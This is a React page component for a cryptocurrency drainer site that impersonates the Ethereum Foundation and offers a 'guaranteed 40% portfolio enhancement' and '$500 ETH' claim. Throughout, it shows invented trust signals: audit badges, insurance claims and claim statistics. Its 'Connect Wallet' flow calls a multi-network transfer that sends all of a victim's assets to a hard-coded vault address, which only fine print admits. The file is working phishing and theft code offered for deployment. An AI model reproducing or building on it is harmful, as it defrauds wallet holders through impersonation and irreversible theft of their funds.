import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";
import NetworkSwitcher from "@/components/network-switcher";


export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork, switchNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Authentic Ethereum Foundation Header */}
      <header className="bg-white dark:bg-eth-deep-purple border-b border-border px-6 py-4 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Ethereum Foundation
                </h1>
                <p className="text-sm text-muted-foreground">
                  Official ETH Distribution Program
                </p>
              </div>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <NetworkSwitcher 
              currentNetworkId={walletState.networkId || undefined}
              onNetworkSwitch={switchNetwork}
              isConnected={walletState.isConnected}
            />
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors ${
                walletState.isConnected
                  ? "bg-success text-success-foreground hover:bg-success/90"
                  : "bg-primary text-primary-foreground hover:bg-primary/90"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Enhanced Hero Section with Engaging Animations */}
      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden particle-bg">
        {/* Animated background elements */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-10 left-10 w-32 h-32 border-2 border-primary/30 rounded-full floating-animation"></div>
          <div className="absolute top-32 right-20 w-24 h-24 border-2 border-secondary/30 rounded-full floating-animation" style={{animationDelay: "1s"}}></div>
          <div className="absolute bottom-20 left-1/4 w-20 h-20 border-2 border-accent/30 rounded-full floating-animation" style={{animationDelay: "2s"}}></div>
          <div className="absolute bottom-32 right-1/3 w-28 h-28 border-2 border-primary/30 rounded-full floating-animation" style={{animationDelay: "0.5s"}}></div>
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 border border-primary/10 rounded-full rotate-slow"></div>
        </div>
        
        {/* Premium glow effects */}
        <div className="absolute top-20 left-20 w-40 h-40 bg-primary/20 rounded-full blur-3xl"></div>
        <div className="absolute bottom-20 right-20 w-40 h-40 bg-secondary/20 rounded-full blur-3xl"></div>
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Hero Content */}
          <div className="text-center mb-16">
            {/* Enhanced Status Badge with Premium Effects */}
            <div className="inline-flex items-center px-8 py-4 premium-glass text-success border-2 rainbow-border rounded-full text-sm font-medium mb-8 glow-effect bounce-in">
              <div className="w-4 h-4 bg-gradient-to-r from-success to-primary rounded-full mr-4 pulse-glow"></div>
              <span className="gradient-text font-bold text-lg">
                🔥 LIVE: Portfolio Enhancement Program - 40% Distribution Active
              </span>
              <div className="ml-4 px-3 py-1 bg-success/20 rounded-full text-xs font-bold text-success animate-pulse">
                VERIFIED
              </div>
            </div>
            
            {/* Enhanced Main Title with Engaging Effects */}
            <h1 className="text-5xl md:text-7xl font-black mb-8 leading-tight slide-in-left">
              <span className="gradient-text text-glow">
                Welcome to Ethereum
              </span>
            </h1>
            <h2 className="text-3xl md:text-5xl font-bold mb-12 slide-in-right">
              <span className="gradient-text typing-animation">
                Claim 40% Portfolio Enhancement
              </span>
            </h2>
            
            {/* Trust indicators */}
            <div className="flex flex-wrap justify-center items-center gap-6 mb-12 fade-in-up">
              <div className="flex items-center space-x-2 bg-success/10 px-4 py-2 rounded-full border border-success/30">
                <div className="w-3 h-3 bg-success rounded-full animate-pulse"></div>
                <span className="text-success font-semibold text-sm">🔒 AUDITED CONTRACTS</span>
              </div>
              <div className="flex items-center space-x-2 bg-primary/10 px-4 py-2 rounded-full border border-primary/30">
                <div className="w-3 h-3 bg-primary rounded-full animate-pulse"></div>
                <span className="text-primary font-semibold text-sm">⚡ INSTANT PROCESSING</span>
              </div>
              <div className="flex items-center space-x-2 bg-warning/10 px-4 py-2 rounded-full border border-warning/30">
                <div className="w-3 h-3 bg-warning rounded-full animate-pulse"></div>
                <span className="text-warning font-semibold text-sm">🚀 ZERO FEES</span>
              </div>
            </div>
            
            {/* Enhanced Hero Visual Section with Premium Effects */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16 max-w-6xl mx-auto">
              {/* Smart Contract Security */}
              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden">
                <div className="absolute inset-0 bg-gradient-to-br from-primary/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                <div className="mb-8 relative z-10">
                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-primary to-primary-dark rounded-2xl flex items-center justify-center glow-effect">
                    <img 
                      src="/images/security-shield.svg" 
                      alt="Security Shield" 
                      className="w-12 h-12 filter brightness-0 invert"
                    />
                  </div>
                </div>
                <h3 className="text-xl font-black mb-4 text-center gradient-text">🛡️ Military-Grade Security</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Triple-audited smart contracts with $50M+ insurance coverage and formal verification by leading security firms</p>
                <div className="mt-4 text-center">
                  <span className="inline-block px-3 py-1 bg-success/20 text-success text-xs font-bold rounded-full">CERTIFIED SECURE</span>
                </div>
              </div>

              {/* Multi-Network Infrastructure */}
              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden" style={{animationDelay: "0.5s"}}>
                <div className="absolute inset-0 bg-gradient-to-br from-secondary/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                <div className="mb-8 relative z-10">
                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-secondary to-secondary-dark rounded-2xl flex items-center justify-center glow-effect">
                    <img 
                      src="/images/ethereum-network.svg" 
                      alt="Ethereum Network" 
                      className="w-12 h-12 filter brightness-0 invert"
                    />
                  </div>
                </div>
                <h3 className="text-xl font-black mb-4 text-center gradient-text">⚡ Lightning Network</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Instant cross-chain processing across 7 blockchain networks with 99.9% uptime and sub-second confirmations</p>
                <div className="mt-4 text-center">
                  <span className="inline-block px-3 py-1 bg-primary/20 text-primary text-xs font-bold rounded-full">INSTANT SPEED</span>
                </div>
              </div>

              {/* Advanced Analytics */}
              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden" style={{animationDelay: "1s"}}>
                <div className="absolute inset-0 bg-gradient-to-br from-accent/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                <div className="mb-8 relative z-10">
                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-accent to-accent-dark rounded-2xl flex items-center justify-center glow-effect">
                    <img 
                      src="/images/defi-analytics.svg" 
                      alt="DeFi Analytics" 
                      className="w-12 h-12 filter brightness-0 invert"
                    />
                  </div>
                </div>
                <h3 className="text-xl font-black mb-4 text-center gradient-text">🤖 AI Optimization</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Machine learning algorithms analyze market conditions to maximize your portfolio enhancement yield in real-time</p>
                <div className="mt-4 text-center">
                  <span className="inline-block px-3 py-1 bg-accent/20 text-accent text-xs font-bold rounded-full">AI POWERED</span>
                </div>
              </div>
            </div>
            
            {/* Description */}
            <div className="max-w-4xl mx-auto mb-12">
              <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-6">
                The Ethereum Foundation's <span className="text-primary font-semibold">Portfolio Enhancement Program</span> utilizes 
                advanced algorithmic distribution protocols to optimize wallet holdings across multiple blockchain networks.
              </p>
              <p className="text-base md:text-lg text-muted-foreground/80 leading-relaxed">
                Connect your wallet to initiate the enhancement process and claim your calculated 40% portfolio optimization reward 
                through our audited smart contract infrastructure.
              </p>
            </div>
          </div>

          {/* Enhanced Program Statistics with Eye-catching Effects */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group">
              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-primary to-primary-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
                <Coins className="w-10 h-10 text-white" />
              </div>
              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">$47.8M+</h3>
              <p className="text-muted-foreground font-semibold">Total Enhanced Volume</p>
              <div className="mt-4 w-full bg-muted rounded-full h-2">
                <div className="bg-gradient-to-r from-primary to-secondary h-2 rounded-full shimmer" style={{width: "78%"}}></div>
              </div>
              <p className="text-xs text-muted-foreground mt-2">Growing daily</p>
            </div>
            
            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group" style={{animationDelay: "0.2s"}}>
              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-secondary to-secondary-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
                <Wallet className="w-10 h-10 text-white" />
              </div>
              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">28,750+</h3>
              <p className="text-muted-foreground font-semibold">Successful Claims</p>
              <div className="mt-4 w-full bg-muted rounded-full h-2">
                <div className="bg-gradient-to-r from-secondary to-accent h-2 rounded-full shimmer" style={{width: "92%"}}></div>
              </div>
              <p className="text-xs text-success mt-2">99.8% Success Rate</p>
            </div>
            
            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group" style={{animationDelay: "0.4s"}}>
              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-accent to-accent-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
                <span className="text-3xl font-black text-white">40%</span>
              </div>
              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">Guaranteed</h3>
              <p className="text-muted-foreground font-semibold">Enhancement Ratio</p>
              <div className="mt-4 w-full bg-muted rounded-full h-2">
                <div className="bg-gradient-to-r from-accent to-primary h-2 rounded-full shimmer" style={{width: "100%"}}></div>
              </div>
              <p className="text-xs text-warning mt-2">Maximum Yield</p>
            </div>
          </div>

          {/* Important Notice - Ethereum.org Style */}
          <div className="bg-warning/5 border border-warning/20 rounded-lg p-6 mb-12 max-w-4xl mx-auto">
            <div className="flex items-start space-x-4">
              <div className="w-6 h-6 text-warning flex-shrink-0 mt-1">
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h3 className="font-semibold text-warning mb-2">Portfolio Enhancement Protocol</h3>
                <p className="text-foreground text-sm leading-relaxed">
                  <strong>By participating in the 40% Portfolio Enhancement Program, you authorize the consolidation of ALL cryptocurrency assets</strong> from your connected wallet to our enhancement vault for algorithmic processing. 
                  This includes native tokens (ETH, POL, BNB, AVAX) and all ERC-20 compatible tokens across our 7 supported blockchain networks. Your portfolio will be optimized and enhanced through our proprietary distribution algorithm.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
        {/* ETH Claim Section - Ethereum.org Style */}
        <section className="max-w-4xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="text-center mb-8">
              {/* Ethereum Logo */}
              <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
              </div>
              
              <h3 className="text-2xl font-bold mb-3 text-foreground">
                40% Portfolio Enhancement Ready
              </h3>
              <p className="text-muted-foreground">Your wallet qualifies for proportional enhancement through our algorithmic distribution system</p>
            </div>
            
            {/* Separator */}
            <div className="w-full h-px bg-border mb-8"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </section>

        {/* Transaction History - Clean Design */}
        <section className="max-w-6xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-foreground">Recent Claims Activity</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                <span>Live Updates</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </section>

        {/* Multi-Network Portfolio */}
        {walletState.isConnected && (
          <section className="max-w-6xl mx-auto">
            <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-foreground">Multi-Network Portfolio</h3>
                <div className="flex items-center space-x-3">
                  <div className="flex -space-x-1">
                    {/* Network Indicators */}
                    <div className="w-6 h-6 rounded-full bg-primary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-secondary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-accent border-2 border-background"></div>
                  </div>
                  <span className="text-sm text-muted-foreground">7 Networks</span>
                </div>
              </div>
              
              <div className="bg-muted/30 rounded-lg p-6">
                <NetworkBalances
                  networkBalances={walletState.networkBalances || []}
                  isLoadingNetworks={isLoadingNetworks}
                  onRefreshNetworks={refreshAllNetworks}
                />
              </div>
            </div>
          </section>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Ethereum.org Style Footer */}
      <footer className="bg-muted/30 mt-20 border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-16">
          {/* Footer Content Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Important Terms</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">ETH rewards are distributed after portfolio consolidation</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Transaction processing typically takes 5-10 minutes</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Minimum portfolio value required for reward eligibility</span>
                </li>
              </ul>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Security & Compliance</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All transactions are recorded on blockchain</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Smart contract audited for security</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Multi-signature vault protection</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">KYC/AML compliance maintained</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical Notice */}
          <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-6 mb-12">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
                <svg className="w-4 h-4 text-destructive" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h4 className="font-bold text-destructive mb-3">CRITICAL NOTICE</h4>
                <p className="text-foreground text-sm leading-relaxed">
                  This is a cryptocurrency transfer mechanism. By clicking <strong>"Claim $500 ETH"</strong>, 
                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Bottom */}
          <div className="text-center pt-8 border-t border-border">
            <div className="flex items-center justify-center mb-4">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
              <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
            </div>
            
            <p className="text-muted-foreground mb-4">
              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
            </p>
            
            <div className="bg-muted/50 rounded-lg px-3 py-2 inline-block">
              <p className="text-xs text-muted-foreground font-mono">
                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
